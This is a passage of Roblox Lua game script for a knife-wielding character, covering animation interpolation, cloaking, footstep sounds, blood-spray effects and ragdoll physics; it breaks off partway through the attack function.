	Player = game:GetService("Players").LocalPlayer
	PlayerGui = Player.PlayerGui
	Cam = workspace.CurrentCamera
	Backpack = Player.Backpack
	Character = Player.Character
	Humanoid = Character.Humanoid
	Mouse = Player:GetMouse()
	RootPart = Character["HumanoidRootPart"]
	Torso = Character["Torso"]
	Head = Character["Head"]
	RightArm = Character["Right Arm"]
	LeftArm = Character["Left Arm"]
	RightLeg = Character["Right Leg"]
	LeftLeg = Character["Left Leg"]
	RootJoint = RootPart["RootJoint"]
	Neck = Torso["Neck"]
	RightShoulder = Torso["Right Shoulder"]
	LeftShoulder = Torso["Left Shoulder"]
	RightHip = Torso["Right Hip"]
	LeftHip = Torso["Left Hip"]

	IT = Instance.new
	CF = CFrame.new
	VT = Vector3.new
	RAD = math.rad
	C3 = Color3.new
	UD2 = UDim2.new
	BRICKC = BrickColor.new
	ANGLES = CFrame.Angles
	EULER = CFrame.fromEulerAnglesXYZ
	COS = math.cos
	ACOS = math.acos
	SIN = math.sin
	ASIN = math.asin
	ABS = math.abs
	MRANDOM = math.random
	FLOOR = math.floor

	--//=================================\\
	--|| 	      USEFUL VALUES
	--\\=================================//

	Animation_Speed = 3
	Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)
	local Speed = 12
	local ROOTC0 = CF(0, 0, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
	local NECKC0 = CF(0, 1, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
	local RIGHTSHOULDERC0 = CF(-0.5, 0, 0) * ANGLES(RAD(0), RAD(90), RAD(0))
	local LEFTSHOULDERC0 = CF(0.5, 0, 0) * ANGLES(RAD(0), RAD(-90), RAD(0))
	local DAMAGEMULTIPLIER = 0
	local ANIM = "Idle"
	local ATTACK = false
	local EQUIPPED = false
	local HOLD = false
	local COMBO = 1
	local Rooted = false
	local SINE = 0
	local KEYHOLD = false
	local CHANGE = 2 / Animation_Speed
	local WALKINGANIM = false
	local VALUE1 = false
	local VALUE2 = false
	local ROBLOXIDLEANIMATION = IT("Animation")
	ROBLOXIDLEANIMATION.Name = "Roblox Idle Animation"
	ROBLOXIDLEANIMATION.AnimationId = "http://www.roblox.com/asset/?id=180435571"
	--ROBLOXIDLEANIMATION.Parent = Humanoid
	local WEAPONGUI = IT("ScreenGui", PlayerGui)
	WEAPONGUI.Name = "Weapon GUI"
	local Weapon = IT("Model")
	Weapon.Name = "Adds"
	local Effects = IT("Folder", Weapon)
	Effects.Name = "Effects"
	local ANIMATOR = Humanoid.Animator
	local ANIMATE = Character.Animate
	local UNANCHOR = true
	local PLAYANIMS = true
	local CLOAKED = false

	--//=================================\\
	--\\=================================//


	--//=================================\\
	--|| SAZERENOS' ARTIFICIAL HEARTBEAT
	--\\=================================//

	ArtificialHB = Instance.new("BindableEvent", script)
	ArtificialHB.Name = "ArtificialHB"

	script:WaitForChild("ArtificialHB")

	frame = Frame_Speed
	tf = 0
	allowframeloss = false
	tossremainder = false
	lastframe = tick()
	script.ArtificialHB:Fire()

	game:GetService("RunService").Heartbeat:connect(function(s, p)
		tf = tf + s
		if tf >= frame then
			if allowframeloss then
				script.ArtificialHB:Fire()
				lastframe = tick()
			else
				for i = 1, math.floor(tf / frame) do
					script.ArtificialHB:Fire()
				end
				lastframe = tick()
			end
			if tossremainder then
				tf = 0
			else
				tf = tf - frame * math.floor(tf / frame)
			end
		end
	end)

	--//=================================\\
	--\\=================================//

	--//=================================\\
	--|| 	      SOME FUNCTIONS
	--\\=================================//

	function Raycast(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
		return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
	end

	function PositiveAngle(NUMBER)
		if NUMBER >= 0 then
			NUMBER = 0
		end
		return NUMBER
	end

	function NegativeAngle(NUMBER)
		if NUMBER <= 0 then
			NUMBER = 0
		end
		return NUMBER
	end

	function Swait(NUMBER)
		if NUMBER == 0 or NUMBER == nil then
			ArtificialHB.Event:wait()
		else
			for i = 1, NUMBER do
				ArtificialHB.Event:wait()
			end
		end
	end

	function CreateMesh(MESH, PARENT, MESHTYPE, MESHID, TEXTUREID, SCALE, OFFSET)
		local NEWMESH = IT(MESH)
		if MESH == "SpecialMesh" then
			NEWMESH.MeshType = MESHTYPE
			if MESHID ~= "nil" and MESHID ~= "" then
				NEWMESH.MeshId = "http://www.roblox.com/asset/?id="..MESHID
			end
			if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
				NEWMESH.TextureId = "http://www.roblox.com/asset/?id="..TEXTUREID
			end
		end
		NEWMESH.Offset = OFFSET or VT(0, 0, 0)
		NEWMESH.Scale = SCALE
		NEWMESH.Parent = PARENT
		return NEWMESH
	end

	function CreatePart(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
		local NEWPART = IT("Part")
		NEWPART.formFactor = FORMFACTOR
		NEWPART.Reflectance = REFLECTANCE
		NEWPART.Transparency = TRANSPARENCY
		NEWPART.CanCollide = false
		NEWPART.Locked = true
		NEWPART.Anchored = true
		if ANCHOR == false then
			NEWPART.Anchored = false
		end
		NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
		NEWPART.Name = NAME
		NEWPART.Size = SIZE
		NEWPART.Position = Torso.Position
		NEWPART.Material = MATERIAL
		NEWPART:BreakJoints()
		NEWPART.Parent = PARENT
		return NEWPART
	end

	local function weldBetween(a, b)
		local weldd = Instance.new("ManualWeld")
		weldd.Part0 = a
		weldd.Part1 = b
		weldd.C0 = CFrame.new()
		weldd.C1 = b.CFrame:inverse() * a.CFrame
		weldd.Parent = a
		return weldd
	end


	function QuaternionFromCFrame(cf)
		local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
		local trace = m00 + m11 + m22
		if trace > 0 then 
			local s = math.sqrt(1 + trace)
			local recip = 0.5 / s
			return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
		else
			local i = 0
			if m11 > m00 then
				i = 1
			end
			if m22 > (i == 0 and m00 or m11) then
				i = 2
			end
			if i == 0 then
				local s = math.sqrt(m00 - m11 - m22 + 1)
				local recip = 0.5 / s
				return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
			elseif i == 1 then
				local s = math.sqrt(m11 - m22 - m00 + 1)
				local recip = 0.5 / s
				return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
			elseif i == 2 then
				local s = math.sqrt(m22 - m00 - m11 + 1)
				local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
			end
		end
	end

	function QuaternionToCFrame(px, py, pz, x, y, z, w)
		local xs, ys, zs = x + x, y + y, z + z
		local wx, wy, wz = w * xs, w * ys, w * zs
		local xx = x * xs
		local xy = x * ys
		local xz = x * zs
		local yy = y * ys
		local yz = y * zs
		local zz = z * zs
		return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
	end

	function QuaternionSlerp(a, b, t)
		local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
		local startInterp, finishInterp;
		if cosTheta >= 0.0001 then
			if (1 - cosTheta) > 0.0001 then
				local theta = ACOS(cosTheta)
				local invSinTheta = 1 / SIN(theta)
				startInterp = SIN((1 - t) * theta) * invSinTheta
				finishInterp = SIN(t * theta) * invSinTheta
			else
				startInterp = 1 - t
				finishInterp = t
			end
		else
			if (1 + cosTheta) > 0.0001 then
				local theta = ACOS(-cosTheta)
				local invSinTheta = 1 / SIN(theta)
				startInterp = SIN((t - 1) * theta) * invSinTheta
				finishInterp = SIN(t * theta) * invSinTheta
			else
				startInterp = t - 1
				finishInterp = t
			end
		end
		return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
	end

	function Clerp(a, b, t)
		local qa = {QuaternionFromCFrame(a)}
		local qb = {QuaternionFromCFrame(b)}
		local ax, ay, az = a.x, a.y, a.z
		local bx, by, bz = b.x, b.y, b.z
		local _t = 1 - t
		return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
	end

	function CreateFrame(PARENT, TRANSPARENCY, BORDERSIZEPIXEL, POSITION, SIZE, COLOR, BORDERCOLOR, NAME)
		local frame = IT("Frame")
		frame.BackgroundTransparency = TRANSPARENCY
		frame.BorderSizePixel = BORDERSIZEPIXEL
		frame.Position = POSITION
		frame.Size = SIZE
		frame.BackgroundColor3 = COLOR
		frame.BorderColor3 = BORDERCOLOR
		frame.Name = NAME
		frame.Parent = PARENT
		return frame
	end

	function CreateLabel(PARENT, TEXT, TEXTCOLOR, TEXTFONTSIZE, TEXTFONT, TRANSPARENCY, BORDERSIZEPIXEL, STROKETRANSPARENCY, NAME)
		local label = IT("TextLabel")
		label.BackgroundTransparency = 1
		label.Size = UD2(1, 0, 1, 0)
		label.Position = UD2(0, 0, 0, 0)
		label.TextColor3 = TEXTCOLOR
		label.TextStrokeTransparency = STROKETRANSPARENCY
		label.TextTransparency = TRANSPARENCY
		label.FontSize = TEXTFONTSIZE
		label.Font = TEXTFONT
		label.BorderSizePixel = BORDERSIZEPIXEL
		label.TextScaled = false
		label.Text = TEXT
		label.Name = NAME
		label.Parent = PARENT
		return label
	end

	function NoOutlines(PART)
		PART.TopSurface, PART.BottomSurface, PART.LeftSurface, PART.RightSurface, PART.FrontSurface, PART.BackSurface = 10, 10, 10, 10, 10, 10
	end

	function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
		local NEWWELD = IT(TYPE)
		NEWWELD.Part0 = PART0
		NEWWELD.Part1 = PART1
		NEWWELD.C0 = C0
		NEWWELD.C1 = C1
		NEWWELD.Parent = PARENT
		return NEWWELD
	end

	local S = IT("Sound")
	function CreateSound(ID, PARENT, VOLUME, PITCH, DOESLOOP)
		local NEWSOUND = nil
		coroutine.resume(coroutine.create(function()
			NEWSOUND = S:Clone()
			NEWSOUND.Parent = PARENT
			NEWSOUND.Volume = VOLUME
			NEWSOUND.Pitch = PITCH
			NEWSOUND.SoundId = "http://www.roblox.com/asset/?id="..ID
			NEWSOUND:play()
			if DOESLOOP == true then
				NEWSOUND.Looped = true
			else
				repeat wait(1) until NEWSOUND.Playing == false
				NEWSOUND:remove()
			end
		end))
		return NEWSOUND
	end

	function MakeForm(PART,TYPE)
		if TYPE == "Cyl" then
			local MSH = IT("CylinderMesh",PART)
		elseif TYPE == "Ball" then
			local MSH = IT("SpecialMesh",PART)
			MSH.MeshType = "Sphere"
		elseif TYPE == "Wedge" then
			local MSH = IT("SpecialMesh",PART)
			MSH.MeshType = "Wedge"
		end
	end

	function CFrameFromTopBack(at, top, back)
		local right = top:Cross(back)
		return CF(at.x, at.y, at.z, right.x, top.x, back.x, right.y, top.y, back.y, right.z, top.z, back.z)
	end

	function PuddleOfBlood(Position,MaxDrop,Model,MaxSize)
		local HITFLOOR, HITPOS, NORMAL = Raycast(Position, (CF(Position, Position + VT(0, -1, 0))).lookVector, MaxDrop, Model)
		if HITFLOOR ~= nil then
			if HITFLOOR.Parent ~= Weapon and HITFLOOR.Parent ~= Character then
				if HITFLOOR.Name == "BloodPuddle" then
					local DIST = (Position - HITFLOOR.Position).Magnitude
					if (HITFLOOR.Size.Z <= 5 and HITFLOOR.Size.Z < MaxSize) or (HITFLOOR.Size.Z > 5 and HITFLOOR.Size.Z < MaxSize and DIST < HITFLOOR.Size.Z/3) then
						HITFLOOR.Size = HITFLOOR.Size + VT(0.1,0,0.1)
					end
				else
					if HITFLOOR.Anchored == true then
						local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(2,0,2))
						BLOOD.CFrame = CF(HITPOS,HITPOS+NORMAL)*ANGLES(RAD(90),RAD(0),RAD(0))
						MakeForm(BLOOD,"Cyl")
						coroutine.resume(coroutine.create(function()
							Swait(75)
							while true do
								Swait()
								BLOOD.Size = BLOOD.Size - VT(0.02,0,0.02)
								if BLOOD.Size.Z < 0.051 then
									BLOOD:remove()
									break
								end
							end
						end))
					end
				end
			end
		end
	end

	function SprayBlood(POSITION,DIRECTION,BloodSize)
		local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(0.3,0.3,0.3),false)
		BLOOD.CFrame = CF(POSITION)
		MakeForm(BLOOD,"Ball")
		local bv = Instance.new("BodyVelocity",BLOOD) 
		bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
		bv.velocity = CF(POSITION,DIRECTION+VT(MRANDOM(-3,3)/30,MRANDOM(-3,3)/30,MRANDOM(-3,3)/30)).lookVector*75
		bv.Name = "MOVE"
		Debris:AddItem(bv,0.05)
		coroutine.resume(coroutine.create(function()
			local HASTOUCHEDGROUND = false
			local HIT = BLOOD.Touched:Connect(function(hit)
				if hit.Anchored == true then
					HASTOUCHEDGROUND = true
					PuddleOfBlood(BLOOD.Position+VT(0,1,0),2,BLOOD,BloodSize)
				end
			end)
			wait(5)
			if HASTOUCHEDGROUND == false then
				BLOOD:remove()
			end
		end))
	end

	Debris = game:GetService("Debris")

	function CastProperRay(StartPos, EndPos, Distance, Ignore)
		local DIRECTION = CF(StartPos,EndPos).lookVector
		return Raycast(StartPos, DIRECTION, Distance, Ignore)
	end

	function turnto(position)
		RootPart.CFrame=CFrame.new(RootPart.CFrame.p,VT(position.X,RootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
	end

	function recurse(root,callback,i)
		i= i or 0
		for _,v in pairs(root:GetChildren()) do
			i = i + 1
			callback(i,v)

			if #v:GetChildren() > 0 then
				i = recurse(v,callback,i)
			end
		end

		return i
	end

	function ragdollJoint(character, part0, part1, attachmentName, className, properties)
		attachmentName = attachmentName.."RigAttachment"
		local constraint = Instance.new(className.."Constraint")
		constraint.Attachment0 = part0:FindFirstChild(attachmentName)
		constraint.Attachment1 = part1:FindFirstChild(attachmentName)
		constraint.Name = "RagdollConstraint"..part1.Name

		for _,propertyData in next,properties or {} do
			constraint[propertyData[1]] = propertyData[2]
		end

		constraint.Parent = character
	end

	function getAttachment0(character, attachmentName)
		for _,child in next,character:GetChildren() do
			local attachment = child:FindFirstChild(attachmentName)
			if attachment then
				return attachment
			end
		end
	end

	function R15Ragdoll(character)
		recurse(character, function(_,v)
			if v:IsA("Attachment") then
				v.Axis = Vector3.new(0, 1, 0)
				v.SecondaryAxis = Vector3.new(0, 0, 1)
				v.Rotation = Vector3.new(0, 0, 0)
			end
		end)
		for _,child in next,character:GetChildren() do
			if child:IsA("Accoutrement") then
				for _,part in next,child:GetChildren() do
					if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
						local attachment1 = part:FindFirstChildOfClass("Attachment")
						local attachment0 = getAttachment0(character,attachment1.Name)
						if attachment0 and attachment1 then
							local constraint = Instance.new("HingeConstraint")
							constraint.Attachment0 = attachment0
							constraint.Attachment1 = attachment1
							constraint.LimitsEnabled = true
							constraint.UpperAngle = 0
							constraint.LowerAngle = 0
							constraint.Parent = character
						end
					elseif part.Name == "HumanoidRootPart" then
						part:remove()
					end
				end
			end
		end

		ragdollJoint(character,character.LowerTorso, character.UpperTorso, "Waist", "BallSocket", {
			{"LimitsEnabled",true};
			{"UpperAngle",5};
		})
		ragdollJoint(character,character.UpperTorso, character.Head, "Neck", "BallSocket", {
			{"LimitsEnabled",true};
			{"UpperAngle",15};
		})

		local handProperties = {
			{"LimitsEnabled", true};
			{"UpperAngle",0};
			{"LowerAngle",0};
		}
		ragdollJoint(character,character.LeftLowerArm, character.LeftHand, "LeftWrist", "Hinge", handProperties)
		ragdollJoint(character,character.RightLowerArm, character.RightHand, "RightWrist", "Hinge", handProperties)

		local shinProperties = {
			{"LimitsEnabled", true};
			{"UpperAngle", 0};
			{"LowerAngle", -75};
		}
		ragdollJoint(character,character.LeftUpperLeg, character.LeftLowerLeg, "LeftKnee", "Hinge", shinProperties)
		ragdollJoint(character,character.RightUpperLeg, character.RightLowerLeg, "RightKnee", "Hinge", shinProperties)

		local footProperties = {
			{"LimitsEnabled", true};
			{"UpperAngle", 15};
			{"LowerAngle", -45};
		}
		ragdollJoint(character,character.LeftLowerLeg, character.LeftFoot, "LeftAnkle", "Hinge", footProperties)
		ragdollJoint(character,character.RightLowerLeg, character.RightFoot, "RightAnkle", "Hinge", footProperties)

		ragdollJoint(character,character.UpperTorso, character.LeftUpperArm, "LeftShoulder", "BallSocket")
		ragdollJoint(character,character.LeftUpperArm, character.LeftLowerArm, "LeftElbow", "BallSocket")
		ragdollJoint(character,character.UpperTorso, character.RightUpperArm, "RightShoulder", "BallSocket")
		ragdollJoint(character,character.RightUpperArm, character.RightLowerArm, "RightElbow", "BallSocket")
		ragdollJoint(character,character.LowerTorso, character.LeftUpperLeg, "LeftHip", "BallSocket")
		ragdollJoint(character,character.LowerTorso, character.RightUpperLeg, "RightHip", "BallSocket")
	end

	function Ragdoll(Character2,CharTorso)
		Character2:BreakJoints()
		local hum = Character2:findFirstChild("Humanoid")
		hum:remove()
		local function Scan(ch)
			local e
			for e = 1,#ch do
				Scan(ch[e]:GetChildren())
				if ch[e].ClassName == "Weld" or ch[e].ClassName == "Motor6D" then
					ch[e]:remove()
				end
			end
		end
		local NEWHUM = IT("Humanoid")
		NEWHUM.Name = "Corpse"
		NEWHUM.Health = 26
		NEWHUM.MaxHealth = 26
		NEWHUM.PlatformStand = true
		NEWHUM.Parent = Character2
		NEWHUM.DisplayDistanceType = "None"

		local ch = Character2:GetChildren()
		local i
		for i = 1,#ch do
			if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
				ch[i]:remove()
			end
		end

		local Torso2 = Character2.Torso
		local movevector = Vector3.new()

		if Torso2 then
			movevector = CFrame.new(CharTorso.Position,Torso2.Position).lookVector
			local Head = Character2:FindFirstChild("Head")
			if Head then
				local Neck = Instance.new("Weld")
				Neck.Name = "Neck"
				Neck.Part0 = Torso2
				Neck.Part1 = Head
				Neck.C0 = CFrame.new(0, 1.5, 0)
				Neck.C1 = CFrame.new()
				Neck.Parent = Torso2

			end
			local Limb = Character2:FindFirstChild("Right Arm")
			if Limb then

				Limb.CFrame = Torso2.CFrame * CFrame.new(1.5, 0, 0)
				local Joint = Instance.new("Glue")
				Joint.Name = "RightShoulder"
				Joint.Part0 = Torso2
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				Joint.C1 = CFrame.new(-0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				Joint.Parent = Torso2

				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = Character2
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb

			end
			local Limb = Character2:FindFirstChild("Left Arm")
			if Limb then

				Limb.CFrame = Torso2.CFrame * CFrame.new(-1.5, 0, 0)
				local Joint = Instance.new("Glue")
				Joint.Name = "LeftShoulder"
				Joint.Part0 = Torso2
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(-1.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				Joint.C1 = CFrame.new(0, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				Joint.Parent = Torso2

				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = Character2
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb

			end
			local Limb = Character2:FindFirstChild("Right Leg")
			if Limb then

				Limb.CFrame = Torso2.CFrame * CFrame.new(0.5, -2, 0)
				local Joint = Instance.new("Glue")
				Joint.Name = "RightHip"
				Joint.Part0 = Torso2
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				Joint.Parent = Torso2

				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = Character2
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb

			end
			local Limb = Character2:FindFirstChild("Left Leg")
			if Limb then

				Limb.CFrame = Torso2.CFrame * CFrame.new(-0.5, -2, 0)
				local Joint = Instance.new("Glue")
				Joint.Name = "LeftHip"
				Joint.Part0 = Torso2
				Joint.Part1 = Limb
				Joint.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				Joint.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				Joint.Parent = Torso2

				local B = Instance.new("Part")
				B.TopSurface = 0
				B.BottomSurface = 0
				B.formFactor = "Symmetric"
				B.Size = Vector3.new(1, 1, 1)
				B.Transparency = 1
				B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
				B.Parent = Character2
				local W = Instance.new("Weld")
				W.Part0 = Limb
				W.Part1 = B
				W.C0 = CFrame.new(0, -0.5, 0)
				W.Parent = Limb

			end
			--[
			local Bar = Instance.new("Part")
			Bar.TopSurface = 0
			Bar.BottomSurface = 0
			Bar.formFactor = "Symmetric"
			Bar.Size = Vector3.new(1, 1, 1)
			Bar.Transparency = 1
			Bar.CFrame = Torso2.CFrame * CFrame.new(0, 0.5, 0)
			Bar.Parent = Character2
			local Weld = Instance.new("Weld")
			Weld.Part0 = Torso2
			Weld.Part1 = Bar
			Weld.C0 = CFrame.new(0, 0.5, 0)
			Weld.Parent = Torso2
			--]]
		end
		Character2.Parent = workspace
		Debris:AddItem(Character2,5)

		return Character2,Torso2
	end

	--//=================================\\
	--||	     WEAPON CREATION
	--\\=================================//

	local Knife = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,1.2,0.2),false)
	local Grip = CreateWeldOrSnapOrMotor("Weld", RightArm, RightArm, Knife, CF(0,-1.2, -0.5) * ANGLES(RAD(0), RAD(0), RAD(180)) * ANGLES(RAD(45), RAD(0), RAD(0)), CF(0, 0.3, 0))
	CreateMesh("SpecialMesh", Knife, "FileMesh", "", "", VT(0.2,0.2,0.2), VT(0,0,0))
	local A = IT("Attachment",Knife)
	A.Position = VT(-0, 0.2, 0.136)
	local B = IT("Attachment",Knife)
	B.Position = VT(-0, -0.95, -0.982)
	local Trail = IT("Trail",Knife)
	Trail.Attachment0 = B
	Trail.Attachment1 = A
	Trail.Lifetime = 0.1
	Trail.Transparency = NumberSequence.new(0.5, 1)
	Trail.Texture = "http://www.roblox.com/asset/?id=1472703539"
	Trail.Enabled = true
	Humanoid.DisplayDistanceType = "None"
	Humanoid.MaxHealth = 800
	Humanoid.Health = 800

	local STEP = CreateSound(131436155, Torso, 3, 1, true)
	STEP.Playing = false
	STEP.Looped = false
	local STEPPING = false
	Humanoid.Running:Connect(function(speed)
		if STEPPING == false then
			STEPPING = true
			repeat
				local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
				wait(8/TORSOVELOCITY)
				local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
				if TORSOVELOCITY > 1 and Torso.Transparency ~= 1 and HITFLOOR ~= nil then
					STEP.Parent = Torso
					STEP.Pitch = MRANDOM(8,12)/10
					STEP:Play()
				end
			until TORSOVELOCITY < 0.6
			STEPPING = false
		end
	end)

	for _, c in pairs(Weapon:GetChildren()) do
		if c.ClassName == "Part" then
			c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		end
	end

	local SKILLTEXTCOLOR = C3(0,0,0)
	local SKILLFONT = "SciFi"
	local SKILLTEXTSIZE = 7

	Weapon.Parent = Character

	Humanoid.Died:connect(function()
		ATTACK = true
	end)

	--//=================================\\
	--||	     DAMAGE FUNCTIONS
	--\\=================================//

	function StatLabel(CFRAME, TEXT, COLOR)
	end

	--//=================================\\
	--||			DAMAGING
	--\\=================================//

	function ApplyDamage(Humanoid,Damage,TorsoPart)
	end

	function ApplyAoE(POSITION,RANGE,MINDMG,MAXDMG,FLING,INSTAKILL)
	end

	--//=================================\\
	--||	ATTACK FUNCTIONS AND STUFF
	--\\=================================//

	function Cloaked()
		CLOAKED = true
		Speed = 0
		local POS = RootPart.Position
		local DISTANCE = 99999
		for i = 1, 15 do
			wait()
			for _, c in pairs(Character:GetChildren()) do
				if c:IsA("BasePart") and c ~= RootPart then
					c.Transparency = c.Transparency + 1/15
				elseif c.ClassName == "Accessory" then
					c.Handle.Transparency = c.Handle.Transparency + 1/15
				end
			end
			Trail.Transparency = NumberSequence.new(0.5+((i/15)/2), 1)
			Knife.Transparency = 1
		end
		Speed = 5
		repeat
			wait()
			DISTANCE = (RootPart.Position - POS).Magnitude
		until DISTANCE > 45 or CLOAKED == false
		Speed = 0
		for i = 1, 15 do
			wait()
			for _, c in pairs(Character:GetChildren()) do
				if c:IsA("BasePart") and c ~= RootPart then
					c.Transparency = 1 - i/15
				elseif c.ClassName == "Accessory" then
					c.Handle.Transparency = 1 - i/15
				end
			end
			Trail.Transparency = NumberSequence.new(1-((0.5/15)*i), 1)
			Knife.Transparency = 1
		end
		Speed = 12
		CLOAKED = false
	end

	function Attack()
		PLAYANIMS = false
		ATTACK = true
		Rooted = false
		local TARGET = nil
		Knife.CanCollide = true
		local HUMAN = nil
		local TORSOPART = nil
		local HIT = Knife.Touched:Connect(function(hit)
			if hit.Parent:FindFirstChildOfClass("Humanoid") then
				local HITBODY = hit.Parent
				local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
				local TORSO = HITBODY:FindFirstChild("Torso") or HITBODY:FindFirstChild("UpperTorso")


			end
		end)

		for i=0, 0.4, 0.1 / Animation_Speed do
			Swait()
			if TARGET then
				break
			end
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(143501853,Knife,2,MRANDOM(8,13)/10,false)
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			if TARGET then
				break
			end
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(35)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(-35)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.5, -0.4) * ANGLES(RAD(90), RAD(0), RAD(35)) * ANGLES(RAD(0), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.25, 0.5, -0.3) * ANGLES(RAD(90), RAD(0), RAD(35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		Knife.CanCollide = false
		if TARGET then
			CLOAKED = false
			local DISPOSE = false
			Rooted = true
			coroutine.resume(coroutine.create(function()
